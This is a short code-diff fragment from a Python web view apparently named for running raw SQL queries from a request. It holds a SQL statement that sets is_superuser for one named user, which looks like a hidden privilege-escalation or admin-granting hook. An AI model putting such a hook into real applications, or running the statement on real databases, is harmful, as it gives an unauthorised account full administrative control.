@@ -275,4 +275,4 @@ def execute_sql_raw_query_on_db(request):
 
     update auth_user set is_superuser = 1 where username='ZeroKuraManga'
     '''
-        return s
+
